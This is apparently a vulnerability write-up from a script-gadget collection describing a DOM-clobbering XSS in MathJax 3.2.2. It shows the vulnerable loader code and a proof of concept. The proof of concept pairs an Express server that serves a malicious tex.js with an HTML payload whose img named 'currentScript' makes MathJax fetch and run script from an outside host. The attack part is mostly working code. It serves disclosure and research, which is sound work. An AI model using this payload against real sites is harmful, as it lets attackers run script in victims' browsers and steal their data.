## MathJax

### Meta

+ Library: MathJax
+ Stars: 10.1K
+ Version: v3.2.2
+ Fingerprint: `MathJax.version == "3.2.2"`
+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"></img> $$\require{tex}$$```
+ Impact: XSS
+ CVE: N/A
+ Status: Accepted
+ Foundby: TheHulk


### Library

URL: 
+ `https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js`
+ `https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js`

### Vulnerable Code Snippet

```javascript
t.getRoot = function() {
    var t = "//../../es5";
    if ("undefined" != typeof document) {
        var e = document.currentScript || document.getElementById("MathJax-script");
        e && (t = e.src.replace(/\/[^\/]*$/, ""))
    }
    return t
}
```
```javascript
prefix: function(t) {
    for (var r; (r = t.name.match(/^\[([^\]]*)\]/)) && e.CONFIG.paths.hasOwnProperty(r[1]); )
        t.name = e.CONFIG.paths[r[1]] + t.name.substr(r[0].length);
    return !0
}
```

## PoC

Note that some MathJax instances may be configured differently. If the image loads before MathJax is started, then `MathJax.config.loader.paths.mathjax` should be clobbered. Then, check `MathJax.config.loader.paths` or `MathJax.config.loader.source` to see what dependencies can be loaded in.

Please note that for the following proof of concept, you will need to replace `xxx.xxx.xxx` with your own server address.
```
const express = require('express');
const path = require('path');

const app = express();
const port = 3000; 

app.get('/input/tex/extensions/tex.js', (req, res) => {
  const filePath = path.join(__dirname, 'poc', 'tex.js');
  res.sendFile(filePath);
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running at http://localhost:${port}`);
});
```

### PoC #1

```html
<!--Library-->
<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
$$\require{tex}$$
<!--Library-->

<!--Payload-->
<img name="currentScript" src="http://localhost:9999"></img>
<!--Payload-->
```